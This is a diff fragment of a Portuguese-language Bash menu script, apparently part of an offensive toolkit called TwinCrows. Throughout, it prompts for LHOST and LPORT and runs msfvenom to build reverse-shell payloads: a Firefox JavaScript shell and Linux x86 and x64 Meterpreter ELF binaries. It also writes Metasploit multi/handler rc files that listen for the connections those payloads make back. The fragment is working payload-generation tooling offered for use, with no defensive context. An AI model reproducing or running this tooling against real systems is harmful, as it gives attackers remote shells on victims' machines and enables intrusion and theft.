+					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+					read rc
+					if [ "$rc" == "s" ]
+					then
+						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/firefox_js_payload.rc${normal}"
+						echo -e "use exploit/multi/handler\nset payload firefox/shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/firefox_js_payload.rc
+					fi
+					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
+					msfvenom -p firefox/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o $TCPayloads/$nome
+					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
+					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
+                		        read opcao
+                        		if [ "$opcao" == "s" ]
+                        		then
+                                		tc_payload
+                        		else
+                                		exec $TCPath/TwinCrows
+                        		fi
+				;;
+				"0")
+					tc_payload
+				;;
+				*)
+		                        echo -e "${vermbold}OPÇÃO INVÁLIDA!!\n\n${normal}"
+                		 ;;
+
+			esac
+			done
+
+		;;
+
+		3)
+			nvl3="${vermbold}┌─[${azulbold}Twin${normalbold}\xE2\x98\xA0${azulbold}Crows${vermbold}]──[${azulbold}Payloads${vermbold}]──[${azulbold}Linux${vermbold}]\n└─────►${normal}"
+			centralizado "${azulbold}===== Linux Payloads =====\n\n${normal}"
+			echo -e "${cinza}Escolha uma das opcoes."
+
+			while :
+			do
+
+			echo -e "${verde}"
+			echo -e "1 - linux/x86/meterpreter_reverse_tcp"
+			echo -e "2 - linux/x64/meterpreter/reverse_tcp"
+			echo
+			echo -e "0 - Voltar"
+
+			echo -e "${normal}"
+			printf $nvl3
+			read -p ' ' opcao3
+
+			echo
+			case $opcao3 in
+				"1")
+					echo -e "${verde}"
+					printf "Informe o LHOST: ${normalbold}"
+					read lhost
+					printf "${verde}Informe o LPORT: ${normalbold}"
+					read lport
+					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.elf: ${normalbold}"
+					read nome
+					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+					read rc
+					if [ "$rc" == "s" ]
+					then
+						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/linux_x86_payload.rc${normal}"
+						echo -e "use exploit/multi/handler\nset payload linux/x86/meterpreter_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/linux_x86_payload.rc
+					fi
+					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
+					msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o $TCPayloads/$nome
+					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
+					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
+                		        read opcao
+                        		if [ "$opcao" == "s" ]
+                        		then
+                                		tc_payload
+                        		else
+                                		exec $TCPath/TwinCrows
+                        		fi
+				;;
+				"2")
+					echo -e "${verde}"
+					printf "Informe o LHOST: ${normalbold}"
+					read lhost
+					printf "${verde}Informe o LPORT: ${normalbold}"
+					read lport
+					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.elf: ${normalbold}"
+					read nome
+					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+					read rc
+					if [ "$rc" == "s" ]
+					then
+						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/linux_x64_payload.rc${normal}"
+						echo -e "use exploit/multi/handler\nset payload linux/x64/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/linux_x64_payload.rc
+					fi
+					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
+					msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o $TCPayloads/$nome
+					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
+					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
+                		        read opcao
+                        		if [ "$opcao" == "s" ]
+                        		then
+                                		tc_payload
+                        		else
+                                		exec $TCPath/TwinCrows
+                        		fi
+				;;
+
+				"0")
+					tc_payload
+				;;
+				*)
+		                        echo -e "${vermbold}OPÇÃO INVÁLIDA!!\n\n${normal}"
+                		 ;;
+
+			esac
+			done
+
+		;;
+		0)
+			exec $TCPath/TwinCrows
+		;;
+		*)
+	                echo -e "${vermbold}OPÇÃO INVÁLIDA!!\n\n${normal}"
+       		 ;;
+
+
+
+	esac
+	done
+
+}
 
 
 
